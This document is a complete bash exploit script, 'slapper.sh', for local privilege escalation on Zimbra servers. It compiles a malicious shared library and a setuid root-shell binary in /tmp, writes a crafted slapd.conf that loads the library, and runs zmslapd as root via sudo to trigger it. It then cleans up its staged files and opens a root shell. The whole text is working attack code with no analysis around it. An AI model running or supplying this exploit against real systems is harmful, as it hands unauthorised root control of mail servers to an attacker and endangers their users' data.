#!/bin/bash
echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
echo "[+] Setting up..."
mkdir /tmp/slapper
cd /tmp/slapper
cat << EOF > /tmp/slapper/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/slapper/rootslap", 0, 0);
    chmod("/tmp/slapper/rootslap", 04755);
    printf("[+] done!\n");
}
EOF
cat << EOF > /tmp/slapper/rootslap.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -static -o /tmp/slapper/rootslap /tmp/slapper/rootslap.c > /dev/null 2>&1
rm -rf /tmp/slapper/rootslap.c
gcc -fPIC -shared -ldl -o /tmp/slapper/libhax.so /tmp/slapper/libhax.c > /dev/null 2>&1
rm -rf /tmp/slapper/libhax.c
cat << EOF > /tmp/slapper/slapd.conf
#
# See slapd.conf(5) for details on configuration options.
# This file should NOT be world readable.
#
include		/opt/zimbra/common/etc/openldap/schema/core.schema

# Define global ACLs to disable default read access.

# Do not enable referrals until AFTER you have a working directory
# service AND an understanding of referrals.
#referral	ldap://root.openldap.org

#pidfile		/opt/zimbra/data/ldap/state/run/slapd.pid
#argsfile	/opt/zimbra/data/ldap/state/run/slapd.args

# Load dynamic backend modules:
modulepath	/tmp/slapper
moduleload	libhax.so
# moduleload	back_ldap.la

# Sample security restrictions
#	Require integrity protection (prevent hijacking)
#	Require 112-bit (3DES or better) encryption for updates
#	Require 63-bit encryption for simple bind
# security ssf=1 update_ssf=112 simple_bind=64

# Sample access control policy:
#	Root DSE: allow anyone to read it
#	Subschema (sub)entry DSE: allow anyone to read it
#	Other DSEs:
#		Allow self write access
#		Allow authenticated users read access
#		Allow anonymous users to authenticate
#	Directives needed to implement policy:
# access to dn.base="" by * read
# access to dn.base="cn=Subschema" by * read
# access to *
#	by self write
#	by users read
#	by anonymous auth
#
# if no access controls are present, the default policy
# allows anyone and everyone to read anything but restricts
# updates to rootdn.  (e.g., "access to * by * read")
#
# rootdn can always read and write EVERYTHING!

#######################################################################
# MDB database definitions
#######################################################################

database	mdb
maxsize		1073741824
suffix		"dc=my-domain,dc=com"
rootdn		"cn=Manager,dc=my-domain,dc=com"
# Cleartext passwords, especially for the rootdn, should
# be avoid.  See slappasswd(8) and slapd.conf(5) for details.
# Use of strong authentication encouraged.
rootpw		secret
# The database directory MUST exist prior to running slapd AND 
# should only be accessible by the slapd and slap tools.
# Mode 700 recommended.
directory	/opt/zimbra/data/ldap/state/openldap-data
# Indices to maintain
index	objectClass	eq
EOF
echo "[+] Triggering our exploit..."
sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/slapper/slapd.conf
echo "[+] Cleaning up staged files..."
rm -rf /tmp/slapper/slapd.conf
rm -rf /tmp/slapper/libhax.so
echo "[$] Pop root shell"
/tmp/slapper/rootslap
